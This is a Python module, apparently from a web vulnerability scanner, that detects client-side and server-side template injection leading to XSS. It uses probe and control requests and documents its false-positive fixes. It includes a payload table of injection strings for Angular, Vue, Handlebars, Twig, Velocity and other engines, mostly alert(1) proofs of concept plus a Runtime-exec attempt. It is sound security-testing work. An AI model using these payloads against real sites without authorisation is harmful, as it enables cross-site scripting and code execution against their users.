"""Template-injection -> XSS detection.

Modern front-end frameworks render `{{ }}` / `<%= %>` / `*{ }` templates
on the CLIENT.  If user input lands inside a template string and the
framework compiles it, an attacker can inject template syntax that
executes arbitrary JS -- this is "client-side SSTI" and is frequently
misclassified as plain XSS.

Frameworks covered:
  * Angular ({{ constructor }} / [prop] / (event) bindings)
  * Vue ({{ }} / v-html / :prop bindings)
  * Mustache / Handlebars ({{ }} / {{{ }}} -- triple braces = raw HTML)
  * Lodash template (<%= %>)
  * Underscore (<%= %>)
  * EJS client-side (<%= %>)

The detection ``scanner_layers._scan_template`` runs is three requests:
  1. inject an arithmetic expression (``{{7*7}}``) and look for its RESULT
     (``49``) in the response -- a verbatim echo means nothing is compiling;
  2. re-send the same parameter with a digits-free value (``CONTROL_VALUE``).
     If that response also contains ``49``, the page produced it on its own
     (line numbers in stack traces, byte counts) and our input is not the
     cause -- Phase 209 found exactly this emitting a critical false positive
     on OWASP Juice Shop;
  3. only then send the framework's XSS payload and require it at the same
     location.

Note what this can and cannot see: the check reads the *HTTP* response, so it
confirms a server-side template compilation.  A purely client-side engine
(Angular/Vue compiling a value the browser received) leaves ``{{7*7}}`` in the
response and renders it later -- that shape is a DOM/JS question and is
evidence the browser has to give (``verify_headless``), not this module.
"""
from __future__ import annotations

import re

# Each entry: (framework, probe_payload, expected_rendered_value, confirm_payload)
# - probe_payload: the template expression to inject.
# - expected_rendered_value: what the framework produces when it compiles
#   the probe.  If we see this in the rendered response, the template
#   engine is executing user input.
# - confirm_payload: a payload that triggers XSS via the framework's
#   native sink once we've confirmed the engine runs.
TEMPLATES: list[tuple[str, str, str, str]] = [
    # Angular / AngularJS
    ("AngularJS",
     "{{7*7}}",
     "49",
     "{{constructor.constructor('alert(1)')()}}"),
    ("Angular",
     "{{7*7}}",
     "49",
     "{{constructor.constructor('alert(1)')()}}"),
    # Vue.js (default delimiters)
    ("Vue",
     "{{7*7}}",
     "49",
     "{{_c('img',{attrs:{src:x,onerror:alert(1)}})}"),
    # Mustache / Handlebars (triple braces = raw HTML)
    ("Mustache",
     "{{7*7}}",
     "49",
     "<img src=x onerror=alert(1)>"),  # via {{{payload}}}
    ("Handlebars",
     "{{7*7}}",
     "49",
     "{{#with 'constructor.constructor(\"alert(1)\")()'}}{{.}}{{/with}}"),
    # Lodash / Underscore / EJS template
    ("Lodash/Underscore",
     "<%=7*7%>",
     "49",
     "<%=alert(1)%>"),
    # EJS
    ("EJS",
     "<%=7*7%>",
     "49",
     "<%=alert(1)%>"),
    # Pug (jade) client-side
    ("Pug",
     "#{7*7}",
     "49",
     "img(onerror='alert(1)')"),
    # DoT.js
    ("DoT",
     "{{=7*7}}",
     "49",
     "{{=alert(1)}}"),
    # Dust.js
    ("Dust",
     "{7*7}",
     "49",
     "{alert(1)}"),
    # Jade (legacy)
    ("Jade",
     "#{7*7}",
     "49",
     "img(onerror='alert(1)')"),
    # Jinja2 (server-side, but reflected in client templates sometimes)
    ("Jinja2",
     "{{7*7}}",
     "49",
     "{{''.constructor.constructor('alert(1)')()}}"),
    # Twig
    ("Twig",
     "{{7*7}}",
     "49",
     "{{_self.env.registerUndefinedFilterCallback('alert')}}{{_self.env.getFilter('1')}}"),
    # Freeswitcher / Velocity / Thymeleaf patterns occasionally seen
    ("Velocity",
     "#set($x=7*7)$x",
     "49",
     "#set($e='exp')$e.class.forName('java.lang.Runtime').getMethod('exec','$e')"),
]


def probes() -> list[tuple[str, str, str]]:
    """Return [(framework, probe_payload, expected_value), ...]"""
    return [(fw, probe, val) for fw, probe, val, _ in TEMPLATES]
#: A digits-free, template-free value to inject in the same parameter as a
#: control (Phase 209).  See ``detect_rendered``.
CONTROL_VALUE = "xssentinelcontrol"


def detect_rendered(response_text: str, expected_value: str,
                    control_text: str | None = None) -> bool:
    """Check whether the rendered response contains the expected value.

    The probe `{{7*7}}` should be reflected VERBATIM if no template engine
    runs, or RENDERED to `49` if the engine runs.  We detect the latter.

    Phase 209: ``control_text`` is the response of the same request carrying
    ``CONTROL_VALUE`` in the same parameter.  Without it this is a bare
    substring test, and `49` is one of the most common two-digit strings in
    an error page -- it is a line number, a byte count, a status code.
    Measured on OWASP Juice Shop: `/redirect?to={{7*7}}` reflected the probe
    verbatim (no engine), yet the page's only `49` sat inside
    `router/route.js:149:13`, and the layer emitted a **critical**
    `template_ssti_dot` whose evidence line claimed the probe "rendered to
    49".  A value that is present when our input contains no digits at all
    was not produced by our input, so it cannot be evidence of rendering.
    """
    if not response_text or not expected_value:
        return False
    if control_text is not None and _standalone(expected_value, control_text):
        return False
    return _standalone(expected_value, response_text)


def _standalone(value: str, text: str) -> bool:
    """``value`` occurs as its own token, not inside a longer hex/number run.

    A bare substring test was defeated by a 32-hex nonce that happened to
    contain ``49`` (measured 2026-10-22 on XSSMaze `nonce-level2`: the
    client group emitted a **critical** `template_ssti_angularjs` because
    the probe response's nonce held ``49`` while the control request drew a
    different nonce; the confirm payload was then reflected verbatim).  A
    templated result appears as its own value (``<div>49</div>``,
    ``49px``); a coincidental one is part of a hex blob (``ab49cd``) or a
    line number (``route.js:149:13``).  Hex boundaries reject both measured
    shapes without rejecting a rendered number followed by a unit letter.
    """
    if not value:
        return False
    return re.search(r"(?<![0-9A-Fa-f])" + re.escape(value)
                     + r"(?![0-9A-Fa-f])", text) is not None


def detect_unrendered(response_text: str, probe: str) -> bool:
    """Check whether the probe was reflected verbatim (no engine ran).

    This is also useful: it confirms the page doesn't sanitize `{{ }}`,
    so an attacker could still attempt framework-specific bypasses.
    """
    if not response_text or not probe:
        return False
    return probe in response_text


def analyze(response_text: str) -> dict:
    """Analyze response for evidence of each template engine.

    Returns: {
        framework: {
            "probe_reflected":  bool,  # probe present verbatim
            "probe_rendered":   bool,  # expected value present (engine runs!)
            "confirm_payload":  str,   # the XSS payload to send next
        },
        ...
    }
    """
    out = {}
    for fw, probe, val, confirm in TEMPLATES:
        out[fw] = {
            "probe_reflected": detect_unrendered(response_text, probe),
            "probe_rendered": detect_rendered(response_text, val),
            "confirm_payload": confirm,
        }
    return out


def exploitable_frameworks(response_text: str,
                           control_text: str | None = None
                           ) -> list[tuple[str, str]]:
    """Return [(framework, confirm_payload), ...] for engines confirmed
    to be rendering user input.

    ``control_text`` (Phase 209) is the same request answered with a
    digits-free value; see ``detect_rendered``.
    """
    out = []
    for fw, probe, val, confirm in TEMPLATES:
        if detect_rendered(response_text, val, control_text):
            out.append((fw, confirm))
    return out
